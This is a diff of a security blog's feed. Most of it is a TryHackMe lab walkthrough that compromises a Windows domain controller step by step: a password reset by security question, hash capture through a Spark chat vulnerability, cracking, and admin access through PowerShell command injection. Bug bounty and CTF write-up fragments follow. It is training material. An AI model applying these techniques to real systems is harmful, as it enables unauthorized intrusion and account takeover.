+3269/tcp  open  globalcatLDAPssl?
+3389/tcp  open  ms-wbt-server       Microsoft Terminal Services
+|_ssl-date: 2022-02-06T06:12:05+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: WINDCORP
+|   NetBIOS_Domain_Name: WINDCORP
+|   NetBIOS_Computer_Name: FIRE
+|   DNS_Domain_Name: windcorp.thm
+|   DNS_Computer_Name: Fire.windcorp.thm
+|   DNS_Tree_Name: windcorp.thm
+|   Product_Version: 10.0.17763
+|_  System_Time: 2022-02-06T06:11:27+00:00
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Fire.windcorp.thm
+| Not valid before: 2022-02-05T05:45:30
+|_Not valid after:  2022-08-07T05:45:30
+5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     errors: 
+|       invalid-namespace
+|       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|     features: 
+|     auth_mechanisms: 
+|     unknown: 
+|     xmpp: 
+|       version: 1.0
+|     stream_id: 6q1pw8isix
+|_    compression_methods: 
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+|_ssl-date: 2022-02-06T06:12:06+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0s from scanner time.
+5223/tcp  open  ssl/jabber
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+|_ssl-date: 2022-02-06T06:12:05+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0s from scanner time.
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    &amp;lt;stream:error xmlns:stream&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://etherx.jabber.org/streams&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;not-well-formed &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;&lt;/span&gt;/&amp;gt;&amp;lt;/stream:error&amp;gt;&amp;lt;/stream:stream&amp;gt;
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     errors: 
+|       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|     features: 
+|     auth_mechanisms: 
+|     unknown: 
+|     xmpp: 
+|_    compression_methods: 
+5229/tcp  open  jaxflow?
+5262/tcp  open  jabber
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     errors: 
+|       invalid-namespace
+|       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|     features: 
+|     auth_mechanisms: 
+|     unknown: 
+|     xmpp: 
+|       version: 1.0
+|     stream_id: 7kayxe2awz
+|_    compression_methods: 
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    &amp;lt;stream:error xmlns:stream&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://etherx.jabber.org/streams&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;not-well-formed &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;&lt;/span&gt;/&amp;gt;&amp;lt;/stream:error&amp;gt;&amp;lt;/stream:stream&amp;gt;
+5263/tcp  open  ssl/jabber
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+|_ssl-date: 2022-02-06T06:12:05+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0s from scanner time.
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     errors: 
+|       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|     features: 
+|     auth_mechanisms: 
+|     unknown: 
+|     xmpp: 
+|_    compression_methods: 
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    &amp;lt;stream:error xmlns:stream&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://etherx.jabber.org/streams&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;not-well-formed &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;&lt;/span&gt;/&amp;gt;&amp;lt;/stream:error&amp;gt;&amp;lt;/stream:stream&amp;gt;
+5269/tcp  open  xmpp                Wildfire XMPP Client
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     errors: 
+|       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|     features: 
+|     auth_mechanisms: 
+|     unknown: 
+|     xmpp: 
+|_    compression_methods: 
+5270/tcp  open  ssl/xmpp            Wildfire XMPP Client
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+|_ssl-date: 2022-02-06T06:12:06+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0s from scanner time.
+5275/tcp  open  jabber
+| fingerprint-strings: 
+|   RPCCheck: 
+|_    &amp;lt;stream:error xmlns:stream&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://etherx.jabber.org/streams&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;not-well-formed &lt;span class=&quot;nv&quot;&gt;xmlns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;urn:ietf:params:xml:ns:xmpp-streams&quot;&lt;/span&gt;/&amp;gt;&amp;lt;/stream:error&amp;gt;&amp;lt;/stream:stream&amp;gt;
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     errors: 
+|       invalid-namespace
+|       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|     features: 
+|     auth_mechanisms: 
+|     unknown: 
+|     xmpp: 
+|       version: 1.0
+|     stream_id: 6p72sw8xd
+|_    compression_methods: 
+5276/tcp  open  ssl/jabber          Ignite Realtime Openfire Jabber server 3.10.0 or later
+|_ssl-date: 2022-02-06T06:12:05+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0s from scanner time.
+| xmpp-info: 
+|   STARTTLS Failed
+|   info: 
+|     capabilities: 
+|     errors: 
+|       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|     features: 
+|     auth_mechanisms: 
+|     unknown: 
+|     xmpp: 
+|_    compression_methods: 
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+5985/tcp  open  http                Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7070/tcp  open  http                Jetty 9.4.18.v20190429
+|_http-server-header: Jetty&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9.4.18.v20190429&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Openfire HTTP Binding Service
+7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+|_http-title: Openfire HTTP Binding Service
+|_http-server-header: Jetty&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9.4.18.v20190429&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+7777/tcp  open  socks5              &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;No authentication&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; connection failed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| socks-auth-info: 
+|_  No authentication
+9090/tcp  open  zeus-admin?
+9091/tcp  open  ssl/xmltec-xmlmail?
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fire.windcorp.thm
+| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.fire.windcorp.thm
+| Not valid before: 2020-05-01T08:39:00
+|_Not valid after:  2025-04-30T08:39:00
+9389/tcp  open  mc-nmf              .NET Message Framing
+49670/tcp open  msrpc               Microsoft Windows RPC
+49674/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc               Microsoft Windows RPC
+49676/tcp open  msrpc               Microsoft Windows RPC
+49695/tcp open  msrpc               Microsoft Windows RPC
+49911/tcp open  msrpc               Microsoft Windows RPC
+6 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+
+Host script results:
+| smb2-time: 
+|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2022-02-06T06:11:30
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Feb  6 11:42:19 2022 -- 1 IP address (1 host up) scanned in 1272.50 seconds&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;port-80-webserver&quot;&gt;Port 80 (webserver)&lt;/h2&gt;
+&lt;p&gt;Visiting the webserver shows a static website for  &lt;strong&gt;windcorp&lt;/strong&gt; which contains information regaring the company the employees etc also in the website there is something that stands out a space that shows IT support people who are online at the moment which will be used in a later stage.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Webpage&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/webpage.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Currently online IT staff&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/itstaffs.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Employees&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/users.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Also in the webpage there is a button to reset password for users which askes a secutity question which is required to change the password.One of the sercurity question is “&lt;strong&gt;What is/was your favourite pets name ?&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/resetpass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the employee section there is only one user who has a dog that is Lily.Opening the image the URI leaks the username and the dog’s name which can be used to reset the password and compramise the account.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Potential username and security question’s answer&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/lily.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/resetpass1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On submitting the request  a new password will be generated and displayed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/newpass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using this credential we can check weather we have smb access or winrm access using crackmapexec.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Checking SMB access&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/lilsmbtest.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Checking WINRM access&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/lilwinrmtest.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;By using this credential we can use crackmapexec and smbclient to connect to the SMB server and see what shares and files are there.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Crackmapexec SMB shares&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/lilsmbshares.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From the above output there are two shares that are not default .&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Smbclient&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/lilsmbclient.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the shared folder there are installation files for Spark a live chat application and also the first flag for the machine.The version of spark provided in the share is vulnerable to &lt;a href=&quot;https://github.com/theart42/cves/blob/master/cve-2020-12772/CVE-2020-12772.md&quot;&gt;CVE-2020-12772&lt;/a&gt;.To exploit this vulnerability we need to install spark on our local machine and since spark uses windows authentication we can use the credentials of the already compramised user to login.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Spark login screen&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/spark1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon loggin in there is an error due certificate issue which can be bypass by going to the advanced option and enabling the not to verify cetificate toggle&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/spark2.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/ra/spark3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can send the exploit payload to buse as he is the only IT staff member that is currently online and mean while start responder to capure incoming NTLM hashes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/spark4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Responder to capture hashes&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/busehash.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can now use hashcat to crack the captured hash for the user buse.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/busehashcat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we can use this credential to check access on the server using crackmapexec.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Checking SMB access&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/busesmbtest.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Checking WINRM access&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/busewinrmtest.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The user buse has access to WINRM we can use evil-winrm to gain access to the server.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Evil WINRM&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/busewinrm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Logging into the server using winrm we can get the second flag.We can now enumerate the current user to find the privileges that the user have.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/buseinfo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The user buse is a member of the group IT by using bloodhound to enumerate different relations.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/sharphound.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Importing the archive to bloodhound and searching for the user buse and listing its details it can be seen that the user buser is a member of the group IT which is also a member of the group Account Operators.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/busebloodhound.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Members in this group has extended rights to change a user’s password this can be confimed using PowerView.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/busepasswdresetperm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon further exploring the machine there is a directory called scripts in the C drive that contains a powershell script which contains a file name that is being read from a user’s home directory which is being run by the Administrator user or run as the Administrator user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/scriptsdir.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/ra/scripts.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/ra/scripts1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that the file hosts.txt is being read and the contents is being passed to the variable p which is then forwarded to Invoke-Expression.This code is vulnerable to code execution by adding a semicolon to the host file and adding arbitarary commands to it.
+When the script is executed and the content of the hosts file is passed to Invoke-Expression the first command that is Test-Connection will fail and the commands after the semicolon will be executed.
+Now we can use the extended rights of the user buse to change the password of the user mentioned in the script to edit the file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/britpasswdreset.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can test this operation using crackmapexec to see weather the password has changed or not.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Checking SMB access&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/britsmbtest.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Checking WINRM access&lt;/strong&gt;
+&lt;img src=&quot;/assets/images/ra/britwinrmtest.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The user has only access to SMB we can now use smbclient to download the hosts file and reupload after making the necessary changes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/britsmbclient.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/images/ra/britsmbclient2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Command Injection Payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/host.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/puthost.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After couple of seconds we can check weather our user is created and added to the Administrator group.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/admin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Our user is now added to the Administrator group we can now either use psexec or evil-winrm to gain access to the machine and read the last flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/ra/adminflag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>Rahul R</name></author><category term="tryhackme" /><category term="infosec" /><category term="smb" /><category term="privesc" /><category term="windows" /><category term="bloodhound" /><category term="spark" /><category term="winrm" /><summary type="html">Ra is a windows machine which starts with a typical business website for Windcorp where there is a password reset function which can be used to change a user&apos;s password to gain access to a SMB share to download spark live chat application which is vulnerable that can be used to harvest a user&apos;s NTLM hash that can be used to gain initial access to the machine.On further exploring the machine a script can be seen that contains a username who&apos;s password can be changed since the user has extended rights to change password as he is a member of the account operator group.Analysing the script we can see that there is command injection vulnerability that can be abused to gain admin privilege and pwn the machine</summary></entry><entry><title type="html">From Multiple IDORs leading to Code Execution on a different Host Container</title><link href="http://localhost:4000/idor-to-rce/" rel="alternate" type="text/html" title="From Multiple IDORs leading to Code Execution on a different Host Container" /><published>2019-10-04T00:00:00+05:30</published><updated>2019-10-04T00:00:00+05:30</updated><id>http://localhost:4000/idor-to-rce</id><content type="html" xml:base="http://localhost:4000/idor-to-rce/">&lt;p&gt;Here is a short write-up on an interesting bug that I found while testing a Site there won’t be many screenshots of the bug as I can’t disclose any detail about the target.&lt;/p&gt;
 
 &lt;p&gt;Let’s talk about the target now the site is somewhat similar to any web hosting platform instead of providing a domain name and hosting web services like WordPress or Joomla. In this platform, we can host services such as Wordpress or Joomla and point that to our domain the backend uses docker as a medium to host the service which means that when we create a new service a docker container is created and the service is isolated within the docker container.&lt;/p&gt;
 
@@ -57,7 +681,7 @@ Upgrade-Insecure-Requests: 1
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/idor-to-rce/db.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;And I was able to take control of the whole site which also means code execution.The company was also generous enough to fix the issue and reward me $$$.&lt;/p&gt;</content><author><name>Rahul R</name></author><category term="bugbounty" /><category term="infosec" /><category term="idor" /><category term="rce" /><summary type="html">Here is a short write-up on an interesting bug that I found while testing a site where I was able to chain multiple IDORs to execute Code on the server</summary></entry><entry><title type="html">COCON XII DOME CTF Walkthrough</title><link href="http://localhost:4000/C0C0N-XII-CTF-Walkthrough/" rel="alternate" type="text/html" title="COCON XII DOME CTF Walkthrough" /><published>2019-10-02T00:00:00+05:30</published><updated>2019-10-02T00:00:00+05:30</updated><id>http://localhost:4000/C0C0N-XII-CTF-Walkthrough</id><content type="html" xml:base="http://localhost:4000/C0C0N-XII-CTF-Walkthrough/">&lt;p&gt;Before we start reading can we just admire the Badge that was given as a part of DOME CTF.&lt;/p&gt;
+&lt;p&gt;And I was able to take control of the whole site which also means code execution.The company was also generous enough to fix the issue and reward me $$$.&lt;/p&gt;</content><author><name>Rahul R</name></author><category term="bugbounty" /><category term="infosec" /><category term="idor" /><category term="rce" /><category term="bugbounty" /><summary type="html">Here is a short write-up on an interesting bug that I found while testing a site where I was able to chain multiple IDORs to execute Code on the server</summary></entry><entry><title type="html">COCON XII DOME CTF Walkthrough</title><link href="http://localhost:4000/C0C0N-XII-CTF-Walkthrough/" rel="alternate" type="text/html" title="COCON XII DOME CTF Walkthrough" /><published>2019-10-02T00:00:00+05:30</published><updated>2019-10-02T00:00:00+05:30</updated><id>http://localhost:4000/C0C0N-XII-CTF-Walkthrough</id><content type="html" xml:base="http://localhost:4000/C0C0N-XII-CTF-Walkthrough/">&lt;p&gt;Before we start reading can we just admire the Badge that was given as a part of DOME CTF.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/cocon-xii-ctf/badge.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -67,31 +691,32 @@ Upgrade-Insecure-Requests: 1
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;domectf{T5EN7Uxp7KjluznduX8tmXlhc5lX0qHH}
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/assets/images/cocon-xii-ctf/botswana.png&quot; alt=&quot;&quot; /&gt;
-In this challenge as the challenge, the description says to read the rules page that was given at the time of registration. On that page, there was a QR code when scanned spits out a link to a gist snippet.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/cocon-xii-ctf/botswana.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this challenge as the challenge, the description says to read the rules page that was given at the time of registration. On that page, there was a QR code when scanned spits out a link to a gist snippet.&lt;/p&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://gist.githubusercontent.com/anees264/90af6d6e6b80c65b18a15e7c0dd769bd/raw/eb0bdcbf19368d9dc4ed66450816ca4314e88dd4/the_rules.txt
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'CB;_9&amp;gt;7&amp;lt;;43Wxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCB^]\[ZYXW
-VUTMqQPON0Fj-IHG@d'&amp;amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMc
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&apos;CB;_9&amp;gt;7&amp;lt;;43Wxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCB^]\[ZYXW
+VUTMqQPON0Fj-IHG@d&apos;&amp;amp;%$#&quot;!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMc
 bgf_dcb[`_X|?&amp;gt;=&amp;lt;;:9876543210/.-CHG@EDCBA@9]~}|{zyxwvutsrqponmlkjihgfedcba`_^
-]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;:9876543210/.-,+*)('&amp;amp;%$#&quot;!~}|{zyxwvutsrqp
-onmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;W9OTMRQPONMLKDh+*)('&amp;amp;%$
-#&quot;!~}|{zyxwvutsrqp.-,+k)('&amp;amp;}|{Aba`_^]\[ZYXWVUTSRQPONMLhgfedcba`YAW{[ZYXWPUTM
-q43210/.-,+*)('&amp;amp;%$#?&amp;gt;~&amp;lt;;492765.Rsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIH
+]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;:9876543210/.-,+*)(&apos;&amp;amp;%$#&quot;!~}|{zyxwvutsrqp
+onmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&amp;gt;=&amp;lt;;W9OTMRQPONMLKDh+*)(&apos;&amp;amp;%$
